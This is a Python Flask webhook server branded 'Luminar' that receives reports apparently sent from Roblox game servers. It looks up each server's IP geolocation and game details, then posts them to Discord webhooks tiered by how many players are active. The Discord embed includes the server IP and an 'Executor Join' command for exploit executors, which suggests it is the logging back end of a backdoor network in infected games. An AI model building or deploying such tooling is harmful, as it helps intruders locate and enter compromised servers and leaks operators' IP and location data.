import os, hashlib, time, requests, logging
from flask import Flask, request, jsonify

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("LuminarProject")

# --- CONFIG ---
AUTH_SECRET = os.environ.get('AUTH_SECRET')
WEBHOOKS = {
    "tier1": os.environ.get('WEBHOOK_0_50'),
    "tier2": os.environ.get('WEBHOOK_50_100'),
    "tier3": os.environ.get('WEBHOOK_100_500'),
    "tier4": os.environ.get('WEBHOOK_INFINITY')
}

def get_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        if res.get('status') == 'success':
            return f"📍 {res.get('city')}, {res.get('country')}"
    except: pass
    return "Unknown Location"

def verify_luminar_security(provided_hash):
    if not AUTH_SECRET: return False
    current_min = time.gmtime().tm_min
    minutes = [current_min, (current_min - 1) % 60, (current_min - 2) % 60]
    for m in minutes:
        if provided_hash == hashlib.sha256(f"{AUTH_SECRET}:{m}".encode()).hexdigest():
            return True
    return False

@app.route('/webhook', methods=['POST'])
def handle_webhook():
    data = request.json
    provided_hash = request.headers.get('X-Luminar-Auth')
    
    if not verify_luminar_security(provided_hash):
        logger.error("Auth Failed")
        return jsonify({"error": "Unauthorized"}), 401

    # Basic Data (Cannot fail)
    place_id = data.get('placeId', 0)
    job_id = data.get('jobId') if data.get('jobId') != "" else "Studio_Session"
    player_count = data.get('playerCount', 0)
    max_players = data.get('maxPlayers', 0)
    server_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # Initialize Defaults (Placeholder data if APIs fail)
    g_name = f"Place ID: {place_id}"
    active = 0
    creator = "Unknown"
    icon = "https://i.imgur.com/8N7u7D6.png" # Default Luminar Icon
    thumb = ""
    location = get_location(server_ip)

    # --- STEP 1: UNIVERSE ID ---
    u_id = None
    try:
        u_res = requests.get(f"https://apis.roblox.com/universes/v1/places/{place_id}/universe", timeout=5).json()
        u_id = u_res.get('universeId')
    except Exception as e: logger.error(f"Universe API Error: {e}")

    # --- STEP 2: GAME DATA (If we have Universe ID) ---
    if u_id:
        try:
            g_res = requests.get(f"https://games.roblox.com/v1/games?universeIds={u_id}", timeout=5).json()
            if g_res.get('data') and len(g_res['data']) > 0:
                g_info = g_res['data'][0]
                g_name = g_info.get('name', g_name)
                active = g_info.get('playing', 0)
                creator = g_info.get('creator', {}).get('name', 'N/A')
        except Exception as e: logger.error(f"Game Info API Error: {e}")

        # --- STEP 3: THUMBNAILS ---
        try:
            i_res = requests.get(f"https://thumbnails.roblox.com/v1/games/icons?universeIds={u_id}&size=256x256&format=Png", timeout=5).json()
            if i_res.get('data') and len(i_res['data']) > 0:
                icon = i_res['data'][0].get('imageUrl', icon)
        except: pass

        try:
            t_res = requests.get(f"https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds={u_id}&size=768x432&format=Png", timeout=5).json()
            if t_res.get('data') and len(t_res['data']) > 0:
                t_list = t_res['data'][0].get('thumbnails', [])
                if t_list:
                    thumb = t_list[0].get('imageUrl', '')
        except: pass

    # --- ROUTING ---
    if active >= 500: target = WEBHOOKS["tier4"]
    elif active >= 100: target = WEBHOOKS["tier3"]
    elif active >= 50: target = WEBHOOKS["tier2"]
    else: target = WEBHOOKS["tier1"]

    if not target:
        return jsonify({"error": "No webhook configured for this tier"}), 500

    # --- CONSTRUCT EMBED ---
    payload = {
        "embeds": [{
            "author": {"name": "Luminar Intelligence", "icon_url": icon},
            "title": f"🚀 Server Log: {g_name}",
            "color": 0xAC00FF,
            "image": {"url": thumb} if thumb else None,
            "thumbnail": {"url": icon},
            "fields": [
                {"name": "🌍 Server Info", "value": f"**IP:** `{server_ip}`\n{location}", "inline": False},
                {"name": "👥 Population", "value": f"**Total Active:** {active:,}\n**Server:** {player_count}/{max_players}", "inline": True},
                {"name": "👑 Creator", "value": f"`{creator}`", "inline": True},
                {"name": "💻 Executor Join", "value": f"```js\nRoblox.GameLauncher.joinGameInstance({place_id}, '{job_id}');\n```", "inline": False}
            ],
            "footer": {"text": f"Luminar Security | JobID: {job_id}"}
        }]
    }

    try:
        requests.post(target, json=payload, timeout=5)
        return jsonify({"status": "Success"}), 200
    except Exception as e:
        logger.error(f"Discord Post Error: {e}")
        return jsonify({"error": "Failed to send to Discord"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
